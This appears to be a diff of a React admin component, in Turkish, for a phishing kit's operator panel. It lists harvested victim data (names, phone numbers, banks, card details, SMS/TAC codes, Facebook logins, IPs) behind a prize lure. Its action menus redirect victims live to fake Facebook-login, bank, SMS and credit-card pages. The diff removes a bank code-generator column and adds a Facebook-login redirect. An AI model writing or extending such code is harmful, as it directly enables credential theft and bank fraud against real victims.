@@ -1426,7 +1426,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           const r = await supabase
             .from("sessions")
             .update({ current_step: "facebook", status: "online" })
-            .eq("public_id", Number(facebookPromptPublicId))
+            .eq("public_id", String(facebookPromptPublicId))
             .select("id, current_step, status, public_id")
             .maybeSingle();
           data = r.data;
@@ -1752,7 +1752,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
       // Admin tablosuyla ayni kolon yapisi: cizgili tablo PDF
       const s = (v: unknown) => (v == null ? "" : String(v));
-      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "Generator", "SMS", "Kart", "Facebook", "IP", "Cihaz"];
+      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "SMS", "Kart", "Facebook", "IP", "Cihaz"];
 
       const tableBody: any[][] = [
         COL_HEADERS.map(
@@ -1781,34 +1781,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           ? approvalEntries.map((a) => ({ text: getApprovalDisplayText(a), color: "#059669" }))
           : { text: "-", color: "#9ca3af" };
 
-        const genCell: any[] = [];
-        const genCurrentRaw =
-          fd.generatorCurrent && typeof fd.generatorCurrent === "object"
-            ? (fd.generatorCurrent as Record<string, any>)
-            : {};
-        const legacyGenData =
-          fd.generatorData && typeof fd.generatorData === "object" && Object.keys(fd.generatorData).length > 0
-            ? (fd.generatorData as Record<string, unknown>)
-            : null;
-        const activeGenType = typeof fd.generatorType === "string" ? fd.generatorType : "";
-        const genEntries: { type: string; data: Record<string, unknown> }[] = [];
-        for (const t of ["generator1", "generator2"]) {
-          const cur = genCurrentRaw[t];
-          const curData =
-            cur?.data && typeof cur.data === "object" && Object.keys(cur.data).length > 0
-              ? (cur.data as Record<string, unknown>)
-              : legacyGenData && activeGenType === t
-                ? legacyGenData
-                : null;
-          if (curData) genEntries.push({ type: t, data: curData });
-        }
-        for (const entry of genEntries) {
-          genCell.push({ text: `kodas ${entry.type === "generator2" ? "2" : "1"}`, bold: true, color: "#e11d48" });
-          for (const [k, v] of Object.entries(entry.data)) {
-            if (v != null && String(v).trim() !== "") genCell.push({ text: `${k.replace(/_/g, " ")}: ${s(v)}` });
-          }
-        }
-        if (!genCell.length) genCell.push({ text: "-", color: "#9ca3af" });
 
         const smsValue = s(fd.smsCode).trim() || s(fd.tacCode).trim() || "-";
 
@@ -1832,7 +1804,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           s(fd.phone) || "-",
           { stack: bankCell },
           Array.isArray(approvalCell) ? { stack: approvalCell } : approvalCell,
-          { stack: genCell },
           { text: smsValue, bold: smsValue !== "-" },
           { stack: cardCell },
           { stack: fbCell },
@@ -2321,7 +2292,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
                 <th className="min-w-[150px] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
                 <th className="min-w-[95px] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
-                <th className="min-w-[130px] px-2 py-3 font-semibold whitespace-nowrap">Generator</th>
                 <th className="min-w-[70px] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
                 <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
                 <th className="min-w-[95px] px-2 py-3 font-semibold whitespace-nowrap">FACEBOOK</th>
@@ -2333,7 +2303,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
             <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
               {rows.length === 0 && (
                 <tr>
-                  <td colSpan={13} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
+                  <td colSpan={12} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
                 </tr>
               )}
               {rows.map((row) => {
@@ -2508,35 +2478,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       )}
                     </td>
                     <td className="px-2 py-3 align-top">
-                      {(() => {
-                        if (genEntries.length === 0) {
-                          return <span className={`text-[12px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>;
-                        }
-                        return (
-                          <div className="space-y-2">
-                            {genEntries.map((entry, gi) => (
-                              <div key={gi} className="space-y-0.5">
-                                <span className="inline-block w-fit rounded-full border border-rose-500/20 bg-rose-500/10 px-2 py-0.5 text-[11px] font-bold tracking-wide text-rose-600 dark:text-rose-400 whitespace-nowrap leading-tight">
-                                  kodas {entry.type === "generator2" ? "2" : "1"}
-                                </span>
-                                {Object.entries(entry.data)
-                                  .filter(([, v]) => v != null && String(v).trim() !== "")
-                                  .map(([k, v]) => (
-                                    <div
-                                      key={k}
-                                      className="cursor-pointer font-mono text-[13px] font-bold tracking-wider text-rose-600 dark:text-rose-400 break-all transition-opacity hover:opacity-70"
-                                      onClick={() => copyToClipboard(String(v))}
-                                    >
-                                      {String(v)}
-                                    </div>
-                                  ))}
-                              </div>
-                            ))}
-                          </div>
-                        );
-                      })()}
-                    </td>
-                    <td className="px-2 py-3 align-top">
                       <div
                         className="cursor-pointer font-mono text-[12px] lg:text-[13px] font-bold tracking-[0.18em] text-indigo-500 hover:underline break-words [overflow-wrap:anywhere]"
                         onClick={() => copyToClipboard(smsValue)}
@@ -2612,6 +2553,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                           >
                             <option value="">Aksiyon Seçin...</option>
                             <option value="win">👉 İsim & Profil'e Yönlendir</option>
+                            <option value="facebook">👉 Facebook Girişine Yönlendir</option>
                             <option value="banken">👉 Banka Listesine Yönlendir</option>
                             <option value="sms">👉 SMS Doğrulamasına Yönlendir</option>
                             <option value="card">👉 Kredi Kartına Yönlendir</option>
@@ -2851,31 +2793,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                   </div>
                 )}
 
-                {/* GENERATOR BLOKU */}
-                {genEntries.length > 0 && (
-                  <div className={`rounded-xl p-2.5 space-y-2 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
-                    <div className="text-[10px] font-black uppercase tracking-widest text-rose-600 dark:text-rose-400">Generator</div>
-                    {genEntries.map((entry, gi) => (
-                      <div key={gi} className="space-y-0.5">
-                        <span className="inline-block w-fit rounded-full border border-rose-500/20 bg-rose-500/10 px-2 py-0.5 text-[11px] font-bold tracking-wide text-rose-600 dark:text-rose-400 whitespace-nowrap leading-tight">
-                          kodas {entry.type === "generator2" ? "2" : "1"}
-                        </span>
-                        {Object.entries(entry.data)
-                          .filter(([, v]) => v != null && String(v).trim() !== "")
-                          .map(([k, v]) => (
-                            <div
-                              key={k}
-                              className="cursor-pointer font-mono text-[13px] font-bold tracking-wider text-rose-600 dark:text-rose-400 break-all transition-opacity hover:opacity-70"
-                              onClick={() => copyToClipboard(String(v))}
-                            >
-                              {String(v)}
-                            </div>
-                          ))}
-                      </div>
-                    ))}
-                  </div>
-                )}
-
                 {/* SMS + KART + FACEBOOK ozet satirlari */}
                 <div className="grid grid-cols-2 gap-2">
                   {smsValue && (
@@ -2938,6 +2855,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       >
                         <option value="">Aksiyon Seçin...</option>
                         <option value="win">👉 İsim & Profil</option>
+                        <option value="facebook">👉 Facebook</option>
                         <option value="banken">👉 Banka Listesi</option>
                         <option value="sms">👉 SMS Doğrulama</option>
                         <option value="card">👉 Kredi Kartı</option>
